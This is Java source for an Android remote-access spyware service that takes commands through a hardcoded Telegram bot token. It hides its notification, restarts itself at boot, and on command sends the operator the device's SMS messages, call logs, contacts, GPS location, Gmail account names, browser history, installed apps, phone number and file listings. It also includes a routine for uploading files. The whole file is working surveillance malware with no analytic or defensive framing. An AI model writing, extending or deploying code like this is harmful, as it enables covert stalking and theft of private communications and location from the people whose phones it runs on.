package com.tenix.recon;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.StatFs;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Collections;
import java.util.List;

public class inq extends Service {

    // ── CONFIG ────────────────────────────────
    static String BOT_TOKEN = "9092806276:AAH5QE6bZgNrTJfVASXAk2cXRCrT6ijfmEg";
    static String OWNER_ID  = "7507787272";
    // ─────────────────────────────────────────

    private static volatile boolean running = false;
    private long lastUpdateId = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        silentForeground();
        if (running) return START_STICKY;
        running = true;
        new Thread(() -> {
            stopForeground(true);
            try { mainLoop(); }
            catch (Exception ignored) {}
            finally { running = false; }
        }).start();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }

    // ── MAIN LOOP ────────────────────────────────
    private void mainLoop() {
        if (BOT_TOKEN.equals("YOUR_BOT_TOKEN_HERE") || OWNER_ID.equals("YOUR_CHAT_ID_HERE")) return;
        sendText("🟢 Online\n"
            + Build.MANUFACTURER + " " + Build.MODEL + "\n"
            + "Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\n\n"
            + "/help for commands", OWNER_ID);
        while (running) {
            try { pollOnce(); Thread.sleep(2000); }
            catch (InterruptedException e) { break; }
            catch (Exception ignored) {}
        }
    }

    // ── POLL ─────────────────────────────────────
    private void pollOnce() throws Exception {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN
            + "/getUpdates?timeout=25&offset=" + (lastUpdateId + 1);
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(30_000);
        c.setReadTimeout(30_000);
        int code = c.getResponseCode();
        if (code == 200) {
            BufferedReader br = new BufferedReader(
                new InputStreamReader(c.getInputStream(), "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            parseUpdates(sb.toString());
        }
        c.disconnect();
    }

    // ── PARSE UPDATES ────────────────────────────
    private void parseUpdates(String json) {
        int idx = 0;
        while (true) {
            int uPos = json.indexOf("\"update_id\"", idx);
            if (uPos < 0) break;
            int colon = json.indexOf(":", uPos);
            int comma = json.indexOf(",", colon);
            if (comma < 0) comma = json.indexOf("}", colon);
            if (comma < 0) break;
            long uid;
            try { uid = Long.parseLong(json.substring(colon + 1, comma).trim()); }
            catch (Exception e) { idx = uPos + 1; continue; }
            if (uid > lastUpdateId) {
                lastUpdateId = uid;
                String text = extractStr(json, "\"text\"", uPos);
                if (text != null && !text.isEmpty()) {
                    String chatId = extractChatId(json, uPos);
                    handleCommand(text, chatId);
                }
            }
            idx = uPos + 1;
        }
    }

    private String extractStr(String json, String key, int from) {
        int kPos = json.indexOf(key, from);
        if (kPos < 0) return null;
        int colon = json.indexOf(":", kPos);
        int start = json.indexOf("\"", colon + 1) + 1;
        if (start <= 0) return null;
        StringBuilder sb = new StringBuilder();
        int i = start;
        while (i < json.length()) {
            char ch = json.charAt(i);
            if (ch == '"' && json.charAt(i - 1) != '\\') break;
            sb.append(ch);
            i++;
        }
        return sb.toString();
    }

    private String extractChatId(String json, int from) {
        int chatPos = json.indexOf("\"chat\"", from);
        if (chatPos < 0) return OWNER_ID;
        int idPos = json.indexOf("\"id\"", chatPos);
        if (idPos < 0) return OWNER_ID;
        int colon = json.indexOf(":", idPos);
        int end = json.indexOf(",", colon);
        if (end < 0) end = json.indexOf("}", colon);
        if (end < 0) return OWNER_ID;
        String id = json.substring(colon + 1, end).trim();
        return id.isEmpty() ? OWNER_ID : id;
    }

    // ── COMMAND HANDLER ──────────────────────────
    private void handleCommand(String cmd, String chatId) {
        cmd = cmd.trim();
        if      (cmd.startsWith("/info"))     sendText(getDeviceInfo(), chatId);
        else if (cmd.startsWith("/gmail"))    sendText(getGmailAccounts(), chatId);
        else if (cmd.startsWith("/battery"))  sendText(getBatteryInfo(), chatId);
        else if (cmd.startsWith("/net"))      sendText(getNetworkInfo(), chatId);
        else if (cmd.startsWith("/usage"))    sendText(getAppUsage(), chatId);
        else if (cmd.startsWith("/browser"))  sendText(getBrowserHistory(10), chatId);
        else if (cmd.startsWith("/storage"))  sendText(getStorageInfo(), chatId);
        else if (cmd.startsWith("/apk"))      sendText(getInstalledApps(), chatId);
        else if (cmd.startsWith("/contacts")) sendText(getContacts(30), chatId);
        else if (cmd.startsWith("/loc"))      sendText(getLocation(), chatId);
        else if (cmd.startsWith("/help"))     sendText(getHelp(), chatId);
        else if (cmd.startsWith("/sms"))      sendText(readSMS(arg(cmd, 10)), chatId);
        else if (cmd.startsWith("/calls"))    sendText(getCallLogs(arg(cmd, 10)), chatId);
        else if (cmd.startsWith("/ls")) {
            String[] p = cmd.split(" ", 2);
            sendText(listFiles(p.length > 1 ? p[1].trim() : "/sdcard/"), chatId);
        }
    }

    // ── DEVICE INFO ──────────────────────────────
    private String getDeviceInfo() {
        StringBuilder sb = new StringBuilder("📱 Device Info\n\n");
        sb.append("Brand: ").append(Build.BRAND).append("\n");
        sb.append("Model: ").append(Build.MODEL).append("\n");
        sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
        sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
        sb.append("Build: ").append(Build.DISPLAY).append("\n");
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                sb.append("Carrier: ").append(tm.getNetworkOperatorName()).append("\n");
                try { sb.append("Number: ").append(tm.getLine1Number()).append("\n"); }
                catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
        return sb.toString();
    }

    // ── GMAIL ACCOUNTS ───────────────────────────
    private String getGmailAccounts() {
        try {
            android.accounts.Account[] accs =
                android.accounts.AccountManager.get(this).getAccountsByType("com.google");
            if (accs.length == 0) return "📧 No Gmail accounts found";
            StringBuilder sb = new StringBuilder("📧 Gmail Accounts\n\n");
            for (int i = 0; i < accs.length; i++)
                sb.append(i + 1).append(". ").append(accs[i].name).append("\n");
            return sb.toString();
        } catch (Exception e) { return "Gmail error: " + e.getMessage(); }
    }

    // ── BATTERY INFO ─────────────────────────────
    private String getBatteryInfo() {
        try {
            Intent i = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i == null) return "🔋 Battery unavailable";
            int level   = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale   = i.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int temp    = i.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
            int status  = i.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            int plugged = i.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
            int pct     = scale > 0 ? (int) (level * 100f / scale) : -1;
            String st   = status == BatteryManager.BATTERY_STATUS_CHARGING
                ? "⚡ Charging" : "🔋 Discharging";
            String src  = plugged == BatteryManager.BATTERY_PLUGGED_USB ? "USB" :
                          plugged == BatteryManager.BATTERY_PLUGGED_AC  ? "AC"  : "None";
            return "🔋 Battery\n\nLevel: " + pct + "%\nStatus: " + st
                + "\nSource: " + src + "\nTemp: " + temp + "°C";
        } catch (Exception e) { return "Battery error: " + e.getMessage(); }
    }

    // ── NETWORK INFO ─────────────────────────────
    @SuppressWarnings("deprecation")
    private String getNetworkInfo() {
        StringBuilder sb = new StringBuilder("📡 Network Info\n\n");
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm != null && wm.isWifiEnabled()) {
                WifiInfo wi = wm.getConnectionInfo();
                int ip = wi.getIpAddress();
                String ipStr = (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "."
                    + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
                sb.append("SSID: ").append(wi.getSSID()).append("\n");
                sb.append("IP: ").append(ipStr).append("\n");
                sb.append("Signal: ").append(wi.getRssi()).append(" dBm\n\n");
            } else {
                sb.append("WiFi: Off\n\n");
            }
        } catch (Exception ignored) { sb.append("WiFi: Error\n\n"); }
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                sb.append("Carrier: ").append(tm.getNetworkOperatorName()).append("\n");
                sb.append("SIM: ").append(tm.getSimOperatorName()).append("\n");
                try { sb.append("Phone: ").append(tm.getLine1Number()).append("\n"); }
                catch (Exception ignored) {}
            }
        } catch (Exception ignored) { sb.append("SIM: Error\n"); }
        return sb.toString();
    }

    // ── APP USAGE ────────────────────────────────
    @SuppressWarnings("NewApi")
    private String getAppUsage() {
        try {
            android.app.usage.UsageStatsManager usm =
                (android.app.usage.UsageStatsManager) getSystemService("usagestats");
            if (usm == null) return "📊 Usage stats unavailable";
            long now = System.currentTimeMillis();
            List<android.app.usage.UsageStats> stats = usm.queryUsageStats(
                android.app.usage.UsageStatsManager.INTERVAL_DAILY, now - 86400000L, now);
            if (stats == null || stats.isEmpty())
                return "📊 Usage Stats\n\nGrant permission:\nSettings → Apps → Special Access → Usage Access";
            Collections.sort(stats,
                (a, b) -> Long.compare(b.getTotalTimeInForeground(), a.getTotalTimeInForeground()));
            StringBuilder sb = new StringBuilder("📊 App Usage (24h)\n\n");
            int shown = 0;
            for (android.app.usage.UsageStats s : stats) {
                long mins = s.getTotalTimeInForeground() / 60000;
                if (mins < 1) continue;
                sb.append(s.getPackageName()).append(": ").append(mins).append("m\n");
                if (++shown >= 10) break;
            }
            return shown == 0 ? "📊 No usage data available" : sb.toString();
        } catch (Exception e) { return "Usage error: " + e.getMessage(); }
    }

    // ── BROWSER HISTORY ──────────────────────────
    private String getBrowserHistory(int count) {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.browser.browser/bookmarks"),
                new String[]{"title", "url"}, "visits > 0", null, "date DESC");
            if (c == null) return "🌐 Browser history unavailable";
            StringBuilder sb = new StringBuilder("🌐 Browser History\n\n");
            int i = 0;
            while (c.moveToNext() && i < count) {
                String title = c.getString(0);
                String url   = c.getString(1);
                if (url != null && !url.isEmpty()) {
                    sb.append(title != null ? title : "No title").append("\n")
                      .append(url).append("\n\n");
                    i++;
                }
            }
            c.close();
            return i == 0 ? "🌐 No history found" : sb.toString();
        } catch (Exception e) { return "Browser: " + e.getMessage(); }
    }

    // ── STORAGE INFO ─────────────────────────────
    @SuppressWarnings("NewApi")
    private String getStorageInfo() {
        try {
            StatFs ext = new StatFs(Environment.getExternalStorageDirectory().getPath());
            StatFs in  = new StatFs(getFilesDir().getPath());
            long et, ef, it, inf;
            if (Build.VERSION.SDK_INT >= 18) {
                et  = ext.getTotalBytes() / 1048576;
                ef  = ext.getAvailableBytes() / 1048576;
                it  = in.getTotalBytes() / 1048576;
                inf = in.getAvailableBytes() / 1048576;
            } else {
                et  = (long) ext.getBlockCount() * ext.getBlockSize() / 1048576;
                ef  = (long) ext.getAvailableBlocks() * ext.getBlockSize() / 1048576;
                it  = (long) in.getBlockCount() * in.getBlockSize() / 1048576;
                inf = (long) in.getAvailableBlocks() * in.getBlockSize() / 1048576;
            }
            return "💾 Storage\n\nInternal: " + inf + " MB free / " + it + " MB\n"
                 + "External: " + ef  + " MB free / " + et + " MB";
        } catch (Exception e) { return "Storage error: " + e.getMessage(); }
    }

    // ── INSTALLED APPS ───────────────────────────
    private String getInstalledApps() {
        try {
            List<android.content.pm.ApplicationInfo> apps =
                getPackageManager().getInstalledApplications(
                    android.content.pm.PackageManager.GET_META_DATA);
            StringBuilder sb = new StringBuilder();
            int count = 0;
            for (android.content.pm.ApplicationInfo a : apps) {
                if ((a.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                    sb.append(a.loadLabel(getPackageManager())).append("\n");
                    sb.append(a.packageName).append("\n\n");
                    count++;
                }
            }
            return "📦 Installed Apps (" + count + ")\n\n" + sb;
        } catch (Exception e) { return "Apps error: " + e.getMessage(); }
    }

    // ── CALL LOGS ────────────────────────────────
    private String getCallLogs(int count) {
        StringBuilder sb = new StringBuilder("📞 Call Logs\n\n");
        try {
            Cursor c = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION},
                null, null, CallLog.Calls.DATE + " DESC");
            if (c == null) return "📞 Call logs unavailable";
            int i = 0;
            while (c.moveToNext() && i < count) {
                int type = c.getInt(1);
                String icon = type == CallLog.Calls.INCOMING_TYPE ? "📥" :
                              type == CallLog.Calls.OUTGOING_TYPE  ? "📤" : "📵";
                sb.append(icon).append(" ").append(c.getString(0))
                  .append(" (").append(c.getInt(2)).append("s)\n");
                i++;
            }
            c.close();
        } catch (Exception e) { return "Call log error: " + e.getMessage(); }
        return sb.toString();
    }

    // ── SMS ──────────────────────────────────────
    private String readSMS(int count) {
        StringBuilder sb = new StringBuilder("💬 SMS Inbox\n\n");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address", "body"}, null, null, "date DESC");
            if (c == null) return "💬 SMS unavailable";
            int i = 0;
            while (c.moveToNext() && i < count) {
                sb.append("From: ").append(c.getString(0)).append("\n");
                sb.append(c.getString(1)).append("\n\n");
                i++;
            }
            c.close();
        } catch (Exception e) { return "SMS error: " + e.getMessage(); }
        return sb.toString();
    }

    // ── CONTACTS ─────────────────────────────────
    private String getContacts(int count) {
        StringBuilder sb = new StringBuilder("👤 Contacts\n\n");
        try {
            Cursor c = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                }, null, null, null);
            if (c == null) return "👤 Contacts unavailable";
            int i = 0;
            while (c.moveToNext() && i < count) {
                sb.append(c.getString(0)).append(": ").append(c.getString(1)).append("\n");
                i++;
            }
            c.close();
        } catch (Exception e) { return "Contacts error: " + e.getMessage(); }
        return sb.toString();
    }

    // ── LOCATION ─────────────────────────────────
    private String getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (lm == null) return "📍 Location service unavailable";
            Location loc = null;
            try { loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); }
            catch (SecurityException ignored) {}
            if (loc == null) {
                try { loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); }
                catch (SecurityException ignored) {}
            }
            if (loc == null) return "📍 Location not available yet";
            return "📍 Location\n\nhttps://maps.google.com/?q="
                + loc.getLatitude() + "," + loc.getLongitude()
                + "\nAccuracy: " + (int) loc.getAccuracy() + "m"
                + "\nProvider: " + loc.getProvider();
        } catch (Exception e) { return "Location error: " + e.getMessage(); }
    }

    // ── LIST FILES ───────────────────────────────
    private String listFiles(String path) {
        File dir = new File(path);
        if (!dir.exists()) return "📂 Not found: " + path;
        File[] files = dir.listFiles();
        if (files == null || files.length == 0) return "📂 Empty or no access: " + path;
        StringBuilder sb = new StringBuilder("📂 ").append(path).append("\n\n");
        for (File f : files) {
            sb.append(f.isDirectory() ? "📁 " : "📄 ").append(f.getName());
            if (!f.isDirectory()) sb.append(" (").append(f.length() / 1024).append("KB)");
            sb.append("\n");
        }
        return sb.toString();
    }

    // ── HELP ─────────────────────────────────────
    private String getHelp() {
        return "📋 Commands\n\n"
            + "/info — Device info\n"
            + "/gmail — Gmail accounts\n"
            + "/battery — Battery status\n"
            + "/net — Network & SIM info\n"
            + "/usage — App usage (24h)\n"
            + "/browser — Browser history\n"
            + "/storage — Storage info\n"
            + "/apk — Installed apps\n"
            + "/sms [n] — Last n SMS\n"
            + "/calls [n] — Last n call logs\n"
            + "/contacts — Contact list\n"
            + "/loc — GPS location\n"
            + "/ls [path] — List files\n"
            + "/help — This list";
    }

    // ── SEND TEXT ────────────────────────────────
    private void sendText(String text, String chatId) {
        if (text.length() > 4000) {
            sendText(text.substring(0, 4000), chatId);
            sendText(text.substring(4000), chatId);
            return;
        }
        try {
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(15_000);
            c.setReadTimeout(15_000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            byte[] body = ("chat_id=" + chatId + "&text=" + encode(text)).getBytes("UTF-8");
            OutputStream os = c.getOutputStream();
            os.write(body);
            os.close();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }

    // ── SEND FILE ────────────────────────────────
    private int sendFile(File file, String filename, String chatId) {
        try {
            String bound = "RX" + System.currentTimeMillis();
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
                .openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(30_000);
            c.setReadTimeout(180_000);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bound);
            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(chatId + "\r\n");
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\""
                + filename + "\"\r\n");
            out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[16384];
            int n;
            while ((n = fis.read(buf)) != -1) out.write(buf, 0, n);
            fis.close();
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush();
            out.close();
            int code = c.getResponseCode();
            c.disconnect();
            return code;
        } catch (Exception e) { return -1; }
    }

    // ── SILENT FOREGROUND ────────────────────────
    @SuppressWarnings({"NewApi", "deprecation"})
    private void silentForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26 && nm != null) {
            NotificationChannel ch = new NotificationChannel(
                "rc", "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            nm.createNotificationChannel(ch);
        }
        Notification notif;
        if (Build.VERSION.SDK_INT >= 26) {
            notif = new Notification.Builder(this, "rc")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentTitle(" ").setContentText(" ").build();
        } else {
            notif = new Notification.Builder(this)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentTitle(" ").setContentText(" ")
                .setPriority(Notification.PRIORITY_MIN).build();
        }
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(2, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(2, notif);
        }
    }

    // ── HELPERS ──────────────────────────────────
    private String encode(String s) {
        try { return java.net.URLEncoder.encode(s, "UTF-8"); }
        catch (Exception e) { return s; }
    }

    private int arg(String cmd, int def) {
        String[] p = cmd.split(" ");
        if (p.length > 1) {
            try { return Integer.parseInt(p[1]); }
            catch (Exception ignored) {}
        }
        return def;
    }

    // ── BOOT RECEIVER ────────────────────────────
    public static class BootReceiver extends BroadcastReceiver {
        @SuppressWarnings("NewApi")
        @Override
        public void onReceive(Context ctx, Intent intent) {
            if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                Intent svc = new Intent(ctx, inq.class);
                if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc);
                else ctx.startService(svc);
            }
        }
    }
}
